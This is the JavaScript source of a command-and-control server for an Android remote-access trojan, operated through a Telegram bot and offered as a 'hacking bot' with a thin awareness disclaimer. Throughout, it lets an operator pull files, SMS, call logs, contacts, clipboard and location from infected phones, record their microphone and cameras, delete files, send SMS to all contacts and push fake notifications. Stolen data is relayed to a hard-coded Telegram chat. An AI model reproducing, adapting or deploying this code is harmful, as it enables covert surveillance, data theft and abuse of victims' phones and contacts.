const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = '8987687225:AAEFIlCRyNyOIBJMIwHkNpZSU92L_0QWdu4'
const id = '6837315281'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function(req, res) {
    res.send('<h1 align="center">تم تحميل الخادم بنجاح</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• رسالة من <b>${req.headers.model}</b> جهاز</b>`,
        parse_mode: 'HTML'
    }, { filename: fileName, contentType: 'application/txt' });
    res.send('');
});

app.post('/uploadText', (req, res) => {
    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body.text, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon);
    appBot.sendMessage(id, `°• الموقع من <b>${req.headers.model}</b> جهاز</b>`, { parse_mode: 'HTML' });
    res.send('');
});

appSocket.on('connection', (socket, req) => {
    const uuid = uuid4.v4();
    const deviceModel = req.headers.model;
    const deviceBattery = req.headers.battery;
    const deviceVersion = req.headers.version;
    const deviceBrightness = req.headers.brightness;
    const deviceProvider = req.headers.provider;

    socket.uuid = uuid;
    appClients.set(uuid, {
        model: deviceModel,
        battery: deviceBattery,
        version: deviceVersion,
        brightness: deviceBrightness,
        provider: deviceProvider
    });

    appBot.sendMessage(id,
        `°• جهاز جديد متصل☑️\n\n` +
        `• طراز الجهاز📱 : <b>${deviceModel}</b>\n` +
        `• بطارية 🔋 : <b>${deviceBattery}</b>\n` +
        `• نسخة أندرويد : <b>${deviceVersion}</b>\n` +
        `• سطوع الشاشة : <b>${deviceBrightness}</b>\n` +
        `• نوع الشريحة SIM : <b>${deviceProvider}</b>`,
        { parse_mode: 'HTML' }
    );

    socket.on('close', function() {
        appBot.sendMessage(id,
            `°• الجهاز غير متصل ❎\n\n` +
            `• طراز الجهاز📱 : <b>${deviceModel}</b>\n` +
            `• بطارية 🔋 : <b>${deviceBattery}</b>\n` +
            `• نسخة أندرويد : <b>${deviceVersion}</b>\n` +
            `• سطوع الشاشة : <b>${deviceBrightness}</b>\n` +
            `• نوع الشريحة SIM : <b>${deviceProvider}</b>`,
            { parse_mode: 'HTML' }
        );
        appClients.delete(socket.uuid);
    });
});

appBot.on('message', (msg) => {
    const chatId = msg.chat.id;

    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.includes('°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إلي')) {
            currentNumber = msg.text;
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
                '• be Careful that the message will not be sent if the number of characters in your message is more than allowed',
                { reply_markup: { force_reply: true } }
            );
        }

        if (msg.reply_to_message.text.includes('°• رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم')) {
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`send_message:${currentNumber}:${msg.text}:`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            const messageText = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`send_message_to_all:${messageText}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد تنزيله')) {
            const filePath = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`file:${filePath}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد حذف')) {
            const filePath = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`delete_file:${filePath}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
            const time = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`microphone:${time}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
            const time = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`rec_camera_main:${time}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
            const time = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`rec_camera_selfie:${time}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
            const toastMsg = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`toast:${toastMsg}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل الرسالة التي تريد ظهورها كإشعار')) {
            const notificationMsg = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`show_notification:${notificationMsg}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioUrl = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`play_audio:${audioUrl}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const url = msg.text;
            currentTitle = url;
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرسالة التي تريد أن تظهر كإشعار\n\n' +
                '• your message will appear in target device status bar like regular notification',
                { reply_markup: { force_reply: true } }
            );
        }

        if (msg.reply_to_message.text.includes('°• رائع ، أدخل الآن الرسالة التي تريد أن تظهر كإشعار')) {
            const notificationText = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`show_notification:${currentTitle}:${notificationText}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.reply_to_message.text.includes('°• أدخل المسار الذي تريد تنزيل الملف منه')) {
            const path = msg.text;
            appSocket.clients.forEach(function(socket) {
                if (socket.uuid == currentUuid) {
                    socket.send(`file:${path}:`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• you will receive a response in the next moment',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }
    }

    if (id == chatId) {
        if (msg.text == '/start') {
            appBot.sendMessage(id,
                '°• • مرحبا بك في بوت اختراق 👋\n\n' +
                '• رجاء عدم استخدام البوت فيما يغضب الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n' +
                '• ترجمه البوت بقيادة ( @king_1_4 )  »طوفان الأقصى⏫🇵🇸\n\n' +
                '• قناتي تليجرا  t.me/Abu_Yamani\n\n' +
                '• اضغط هن( /start )',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['الأجهزة المتصلة🤖'],
                            ['قائمة الأوامر🕹']
                        ],
                        resize_keyboard: true
                    }
                }
            );
        }

        if (msg.text == 'الأجهزة المتصلة🤖') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا تتوفر أجهزة توصيل ❎\n\n' +
                    '• make sure the application is installed on the target device'
                );
            } else {
                let devicesList = '°• قائمة الأجهزة المتصلة🤖 :\n\n';
                appClients.forEach(function(client, uuid, map) {
                    devicesList +=
                        `• طراز الجهاز📱 : <b>${client.model}</b>\n` +
                        `• بطارية 🔋 : <b>${client.battery}</b>\n` +
                        `• نسخة أندرويد : <b>${client.version}</b>\n` +
                        `• سطوع الشاشة : <b>${client.brightness}</b>\n` +
                        `• نوع الشريحة SIM : <b>${client.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
            }
        }

        if (msg.text == 'قائمة الأوامر🕹') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا تتوفر أجهزة توصيل ❎\n\n' +
                    '• make sure the application is installed on the target device'
                );
            } else {
                const inlineButtons = [];
                appClients.forEach(function(client, uuid, map) {
                    inlineButtons.push([
                        { text: client.model, callback_data: 'device:' + uuid }
                    ]);
                });
                appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الثناء', {
                    reply_markup: {
                        inline_keyboard: inlineButtons
                    }
                });
            }
        }
    } else {
        appBot.sendMessage(id, '°• تم رفض الإذن');
    }
});

appBot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const prefix = data.split(':')[0];
    const uuid = data.split(':')[1];
    console.log(uuid);

    if (prefix == 'device') {
        appBot.editMessageText(
            `°• حدد الجهاز لتنفيذ الثناء : <b>${appClients.get(data.split(':')[1]).model}</b>`,
            {
                width: 10000,
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📱تطبيقات', callback_data: `apps:${uuid}:` },
                         { text: 'ℹ️معلومات الجهاز', callback_data: `device_info:${uuid}:` }],
                        [{ text: '🗂️الحصول على ملف', callback_data: `file:${uuid}:` },
                         { text: '📂حذف الملف', callback_data: `delete_file:${uuid}:` }],
                        [{ text: '📋حافظة', callback_data: `clipboard:${uuid}:` },
                         { text: '🎤ميكروفون', callback_data: `microphone:${uuid}:` }],
                        [{ text: '📷الكاميرا الرئيسي', callback_data: `camera_main:${uuid}:` },
                         { text: '📸كاميرا السيلفي', callback_data: `camera_selfie:${uuid}:` }],
                        [{ text: '🚩الموقع', callback_data: `location:${uuid}:` },
                         { text: '‼️حمص ', callback_data: `toast:${uuid}:` }],
                        [{ text: '📞المكالمات', callback_data: `calls:${uuid}:` },
                         { text: '📒جهات الاتصال', callback_data: `contacts:${uuid}:` }],
                        [{ text: '📳يهتز ', callback_data: `vibrate:${uuid}:` },
                         { text: '🔔إظهار الإشعار', callback_data: `show_notification:${uuid}:` }],
                        [{ text: '✉️رسائل', callback_data: `messages:${uuid}:` },
                         { text: '📨ارسل رسالة', callback_data: `send_message:${uuid}:` }],
                        [{ text: '🔊تشغيل الصوت', callback_data: `play_audio:${uuid}:` },
                         { text: '🔇إيقاف الصوت', callback_data: `stop_audio:${uuid}:` }],
                        [{ text: '📨إرسال رسالة إلى جميع جهات الاتصال ', callback_data: `send_message_to_all:${uuid}:` }]
                    ]
                },
                parse_mode: 'HTML'
            }
        );
    }

    if (prefix == 'apps') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'device_info') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'clipboard') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'camera_main') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'camera_selfie') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'location') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'vibrate') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'stop_audio') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'calls') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'contacts') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'messages') {
        appSocket.clients.forEach(function(socket) {
            if (socket.uuid == uuid) {
                socket.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• you will receive a response in the next moment',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['الأجهزة المتصلة🤖'],
                        ['قائمة الأوامر🕹']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    if (prefix == 'send_message') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• • يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه\n\n' +
            '•is you want to send sms to local number, you can enter the number with Zero at the beginning, otherwise enter the number with the country code',
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    if (prefix == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
            '• you do not need to enter the full file path, just enter the main path. For example, enter<b> DCIM/Camera </b> to receive gallery files.',
            { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
        );
        currentUuid = uuid;
    }

    if (prefix == 'file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد تنزيله \n\n' +
            '• you do not need to enter the full file path, just enter the main path. For example, enter<b> DCIM/Camera </b> to receive gallery files.',
            { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
        );
        currentUuid = uuid;
    }

    if (prefix == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد حذف\n\n' +
            '• you do not need to enter the full file path, just enter the main path. For example, enter<b> DCIM/Camera </b> to delete gallery files.',
            { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
        );
        currentUuid = uuid;
    }

    if (prefix == 'microphone') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
            '• note that you must enter the time numerically in unit of seconds',
            { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
        );
        currentUuid = uuid;
    }

    if (prefix == 'toast') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n' +
            '• toast is a short message that appears on the device screen for a few seconds',
            { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
        );
        currentUuid = uuid;
    }

    if (prefix == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
            '• your message will appear in target device status bar like regular notification',
            { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
        );
        currentUuid = uuid;
    }

    if (prefix == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• note that you must enter the direct link of the desired sound, otherwise the sound will not be played',
            { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
        );
        currentUuid = uuid;
    }
});

setInterval(function() {
    appSocket.clients.forEach(function(socket) {
        socket.send('ping');
    });
    try {
        axios.get(address).then((response) => {
            return '';
        });
    } catch (e) {}
}, 5000);

appServer.listen(process.env.PORT || 8999);
